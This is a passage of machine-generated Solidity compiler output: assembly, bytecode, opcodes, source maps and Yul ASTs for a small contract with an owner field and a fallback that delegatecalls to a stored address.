swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1096:1192   */\n    tag_21:\n        /* \"#utility.yul\":1133:1140   */\n      0x00\n        /* \"#utility.yul\":1162:1186   */\n      tag_33\n        /* \"#utility.yul\":1180:1185   */\n      dup3\n        /* \"#utility.yul\":1162:1186   */\n      tag_20\n      jump\t// in\n    tag_33:\n        /* \"#utility.yul\":1151:1186   */\n      swap1\n      pop\n        /* \"#utility.yul\":1096:1192   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1198:1316   */\n    tag_22:\n        /* \"#utility.yul\":1285:1309   */\n      tag_35\n        /* \"#utility.yul\":1303:1308   */\n      dup2\n        /* \"#utility.yul\":1285:1309   */\n      tag_21\n      jump\t// in\n    tag_35:\n        /* \"#utility.yul\":1280:1283   */\n      dup3\n        /* \"#utility.yul\":1273:1310   */\n      mstore\n        /* \"#utility.yul\":1198:1316   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1322:1544   */\n    tag_16:\n        /* \"#utility.yul\":1415:1419   */\n      0x00\n        /* \"#utility.yul\":1453:1455   */\n      0x20\n        /* \"#utility.yul\":1442:1451   */\n      dup3\n        /* \"#utility.yul\":1438:1456   */\n      add\n        /* \"#utility.yul\":1430:1456   */\n      swap1\n      pop\n        /* \"#utility.yul\":1466:1537   */\n      tag_37\n        /* \"#utility.yul\":1534:1535   */\n      0x00\n        /* \"#utility.yul\":1523:1532   */\n      dup4\n        /* \"#utility.yul\":1519:1536   */\n      add\n        /* \"#utility.yul\":1510:1516   */\n      dup5\n        /* \"#utility.yul\":1466:1537   */\n      tag_22\n      jump\t// in\n    tag_37:\n        /* \"#utility.yul\":1322:1544   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220976c2cd3ca30ab452c5f67efaa7af1159490664a92dc9a7cf70a4a335e94608564736f6c63430008110033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_45": {
									"entryPoint": null,
									"id": 45,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"abi_decode_t_address_fromMemory": {
									"entryPoint": 263,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_address_fromMemory": {
									"entryPoint": 284,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 222,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 190,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 185,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_address": {
									"entryPoint": 240,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:1199:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "47:35:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "57:19:1",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "73:2:1",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "67:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "67:9:1"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nodeType": "YulIdentifier",
																	"src": "57:6:1"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nodeType": "YulTypedName",
														"src": "40:6:1",
														"type": ""
													}
												],
												"src": "7:75:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "177:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "194:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "197:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "187:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "187:12:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "187:12:1"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nodeType": "YulFunctionDefinition",
												"src": "88:117:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "300:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "317:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "320:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "310:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "310:12:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "310:12:1"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nodeType": "YulFunctionDefinition",
												"src": "211:117:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "379:81:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "389:65:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "404:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "411:42:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "400:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "400:54:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "389:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "361:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "371:7:1",
														"type": ""
													}
												],
												"src": "334:126:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "511:51:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "521:35:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "550:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "532:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "532:24:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "521:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "493:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "503:7:1",
														"type": ""
													}
												],
												"src": "466:96:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "611:79:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "668:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "677:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "680:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "670:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "670:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "670:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "634:5:1"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "659:5:1"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nodeType": "YulIdentifier",
																					"src": "641:17:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "641:24:1"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "631:2:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "631:35:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "624:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "624:43:1"
															},
															"nodeType": "YulIf",
															"src": "621:63:1"
														}
													]
												},
												"name": "validator_revert_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "604:5:1",
														"type": ""
													}
												],
												"src": "568:122:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "759:80:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "769:22:1",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "784:6:1"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "778:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "778:13:1"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "769:5:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "827:5:1"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address",
																	"nodeType": "YulIdentifier",
																	"src": "800:26:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "800:33:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "800:33:1"
														}
													]
												},
												"name": "abi_decode_t_address_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "737:6:1",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "745:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "753:5:1",
														"type": ""
													}
												],
												"src": "696:143:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "922:274:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "968:83:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nodeType": "YulIdentifier",
																				"src": "970:77:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "970:79:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "970:79:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "943:7:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "952:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "939:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "939:23:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "964:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "935:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "935:32:1"
															},
															"nodeType": "YulIf",
															"src": "932:119:1"
														},
														{
															"nodeType": "YulBlock",
															"src": "1061:128:1",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "1076:15:1",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1090:1:1",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "1080:6:1",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "1105:74:1",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "1151:9:1"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "1162:6:1"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "1147:3:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "1147:22:1"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "1171:7:1"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address_fromMemory",
																			"nodeType": "YulIdentifier",
																			"src": "1115:31:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1115:64:1"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "1105:6:1"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_address_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "892:9:1",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "903:7:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "915:6:1",
														"type": ""
													}
												],
												"src": "845:351:1"
											}
										]
									},
									"contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506040516103423803806103428339818101604052810190610032919061011c565b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610149565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100e9826100be565b9050919050565b6100f9816100de565b811461010457600080fd5b50565b600081519050610116816100f0565b92915050565b600060208284031215610132576101316100b9565b5b600061014084828501610107565b91505092915050565b6101ea806101586000396000f3fe608060405234801561001057600080fd5b506004361061002f5760003560e01c80638da5cb5b146100be57610030565b5b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660003660405161007c92919061013f565b600060405180830381855af49150503d80600081146100b7576040519150601f19603f3d011682016040523d82523d6000602084013e6100bc565b606091505b005b6100c66100dc565b6040516100d39190610199565b60405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600081905092915050565b82818337600083830152505050565b60006101268385610100565b935061013383858461010b565b82840190509392505050565b600061014c82848661011a565b91508190509392505050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061018382610158565b9050919050565b61019381610178565b82525050565b60006020820190506101ae600083018461018a565b9291505056fea2646970667358221220976c2cd3ca30ab452c5f67efaa7af1159490664a92dc9a7cf70a4a335e94608564736f6c63430008110033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x342 CODESIZE SUB DUP1 PUSH2 0x342 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0x11C JUMP JUMPDEST DUP1 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x149 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xE9 DUP3 PUSH2 0xBE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xF9 DUP2 PUSH2 0xDE JUMP JUMPDEST DUP2 EQ PUSH2 0x104 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x116 DUP2 PUSH2 0xF0 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x132 JUMPI PUSH2 0x131 PUSH2 0xB9 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x140 DUP5 DUP3 DUP6 ADD PUSH2 0x107 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x1EA DUP1 PUSH2 0x158 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2F JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0xBE JUMPI PUSH2 0x30 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 CALLDATASIZE PUSH1 0x40 MLOAD PUSH2 0x7C SWAP3 SWAP2 SWAP1 PUSH2 0x13F JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 GAS DELEGATECALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0xB7 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0xBC JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST STOP JUMPDEST PUSH2 0xC6 PUSH2 0xDC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xD3 SWAP2 SWAP1 PUSH2 0x199 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP3 DUP2 DUP4 CALLDATACOPY PUSH1 0x0 DUP4 DUP4 ADD MSTORE POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x126 DUP4 DUP6 PUSH2 0x100 JUMP JUMPDEST SWAP4 POP PUSH2 0x133 DUP4 DUP6 DUP5 PUSH2 0x10B JUMP JUMPDEST DUP3 DUP5 ADD SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x14C DUP3 DUP5 DUP7 PUSH2 0x11A JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x183 DUP3 PUSH2 0x158 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x193 DUP2 PUSH2 0x178 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1AE PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x18A JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP8 PUSH13 0x2CD3CA30AB452C5F67EFAA7AF1 ISZERO SWAP5 SWAP1 PUSH7 0x4A92DC9A7CF70A 0x4A CALLER 0x5E SWAP5 PUSH1 0x85 PUSH5 0x736F6C6343 STOP ADDMOD GT STOP CALLER ",
							"sourceMap": "233:327:0:-:0;;;309:113;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;374:16;354:8;;:37;;;;;;;;;;;;;;;;;;406:10;398:5;;:18;;;;;;;;;;;;;;;;;;309:113;233:327;;88:117:1;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:143::-;753:5;784:6;778:13;769:22;;800:33;827:5;800:33;:::i;:::-;696:143;;;;:::o;845:351::-;915:6;964:2;952:9;943:7;939:23;935:32;932:119;;;970:79;;:::i;:::-;932:119;1090:1;1115:64;1171:7;1162:6;1151:9;1147:22;1115:64;:::i;:::-;1105:74;;1061:128;845:351;;;;:::o;233:327:0:-;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@_65": {
									"entryPoint": null,
									"id": 65,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@owner_25": {
									"entryPoint": 220,
									"id": 25,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"abi_encode_t_address_to_t_address_fromStack": {
									"entryPoint": 394,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_bytes_calldata_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 282,
									"id": null,
									"parameterSlots": 3,
									"returnSlots": 1
								},
								"abi_encode_tuple_packed_t_bytes_calldata_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed": {
									"entryPoint": 319,
									"id": null,
									"parameterSlots": 3,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_address__to_t_address__fromStack_reversed": {
									"entryPoint": 409,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 256,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 376,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 344,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"copy_calldata_to_memory_with_cleanup": {
									"entryPoint": 267,
									"id": null,
									"parameterSlots": 3,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:1547:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "120:34:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "130:18:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "145:3:1"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nodeType": "YulIdentifier",
																	"src": "130:11:1"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "92:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "97:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nodeType": "YulTypedName",
														"src": "108:11:1",
														"type": ""
													}
												],
												"src": "7:147:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "224:82:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "dst",
																		"nodeType": "YulIdentifier",
																		"src": "247:3:1"
																	},
																	{
																		"name": "src",
																		"nodeType": "YulIdentifier",
																		"src": "252:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "257:6:1"
																	}
																],
																"functionName": {
																	"name": "calldatacopy",
																	"nodeType": "YulIdentifier",
																	"src": "234:12:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "234:30:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "234:30:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dst",
																				"nodeType": "YulIdentifier",
																				"src": "284:3:1"
																			},
																			{
																				"name": "length",
																				"nodeType": "YulIdentifier",
																				"src": "289:6:1"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "280:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "280:16:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "298:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "273:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "273:27:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "273:27:1"
														}
													]
												},
												"name": "copy_calldata_to_memory_with_cleanup",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "src",
														"nodeType": "YulTypedName",
														"src": "206:3:1",
														"type": ""
													},
													{
														"name": "dst",
														"nodeType": "YulTypedName",
														"src": "211:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "216:6:1",
														"type": ""
													}
												],
												"src": "160:146:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "452:209:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "462:95:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "545:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "550:6:1"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "469:75:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "469:88:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
